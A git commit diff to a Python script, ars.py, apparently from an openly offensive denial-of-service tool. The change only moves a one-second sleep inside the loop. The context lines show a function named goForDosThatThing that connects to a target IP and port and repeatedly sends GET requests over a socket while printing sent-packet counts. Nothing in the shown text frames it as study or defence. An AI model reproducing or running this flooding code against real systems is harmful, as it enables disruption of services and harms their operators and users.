46ae9932272d4b2f0efd23c96e5f8e5220166b9e
Kun-fy <kosakatakun@gmail.com>
2026-02-10 07:54:46 +0700

    Update ars.py

--- ars.py
+++ ars.py
@@ -57,9 +57,9 @@ def goForDosThatThing():
                 dosSocket.connect((ip, port))
                 for i in range(speedPerRun):
                     try:
+                        time.sleep(1) 
                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
-                        time.sleep(1) 
                         print(Colors.BOLD + Colors.OKBLUE + "Sent packet . . . ." + Colors.FAIL + str(Count.packetCounter))
                         Count.packetCounter = Count.packetCounter + 1
                         print(Colors.BOLD + Colors.BOLD + "successful:> " + Colors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + Colors.OKGREEN + "")
